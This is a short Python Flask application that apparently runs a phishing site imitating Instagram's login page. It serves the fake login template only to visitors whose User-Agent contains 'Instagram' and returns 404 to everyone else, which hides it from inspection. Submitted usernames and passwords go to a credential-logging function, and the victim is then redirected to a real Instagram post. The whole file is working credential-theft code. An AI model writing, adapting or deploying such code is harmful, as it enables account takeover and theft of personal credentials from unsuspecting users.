from flask import Flask, request, render_template, redirect, abort
from credentials_logger import log_credentials


app = Flask(__name__)

if app.debug:               # If we're testing, allow connections from any useragent
    INSTAGRAM_USERAGENT_SIGNATURE = ""
else:                       # If we're in production mode, only allow connections from the Instagram web client
    INSTAGRAM_USERAGENT_SIGNATURE = "Instagram"


@app.route('/login', methods=['POST'])
def login():
    if not request.form['username']:
        abort(400)
    if not request.form['password']:
        abort(400)
    log_credentials(request.form['username'], request.form['password'])
    return redirect('https://www.instagram.com/p/NdYIBT9hYfq6yfzrf8Zr')


@app.route('/', methods=['GET'])
@app.route('/<path:p>', methods=['GET'])
def login_page(p: str=None):
    if INSTAGRAM_USERAGENT_SIGNATURE in request.headers.get('User-Agent'):
        return render_template('instagram-login.html')
    else:
        abort(404)


if __name__ == '__main__':
    app.run()
